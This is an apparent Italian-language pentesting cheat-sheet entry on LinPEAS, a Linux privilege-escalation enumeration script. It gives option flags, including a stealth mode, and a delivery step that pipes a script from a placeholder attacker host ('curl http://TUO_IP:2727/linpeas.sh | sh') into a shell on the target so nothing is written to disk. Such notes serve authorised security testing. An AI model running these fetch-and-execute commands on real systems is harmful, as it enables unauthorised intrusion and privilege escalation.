# LinPEAS — enumerazione automatica per PrivEsc Linux

Script (e binario statico) della suite [PEASS-ng](https://github.com/peass-ng/PEASS-ng):
enumerazione completa della target alla ricerca di vettori di privilege escalation —
SUID, cronjob, sudoers, capabilities, credenziali in chiaro, NFS, kernel e molto altro.

I risultati sono colorati: **rosso/giallo** = quasi sicuramente sfruttabile,
**rosso** = da controllare. Leggi prima quelli.

Consegna alla target con SLConsole:

    serve on                                     # server HTTP di delivery
    # sulla target:
    curl http://TUO_IP:2727/linpeas.sh | sh      # esecuzione in memoria, niente file

Varianti utili sulla target:

    ./linpeas.sh -a            # check più profondi (più lento e rumoroso)
    ./linpeas.sh -s            # superfast, solo i check essenziali
    ./linpeas.sh -q            # stealth: salta i check che toccano disco/CPU pesante
    ./linpeas.sh -e            # export in HTML/JSON

Se la target non ha bash/sh utilizzabile, usa il binario statico
`linpeas_linux_amd64` (va scaricato e reso eseguibile).

Vedi anche: `notes privilege-escalation`, `gtfobins <bin> suid`, `linseal -i`.
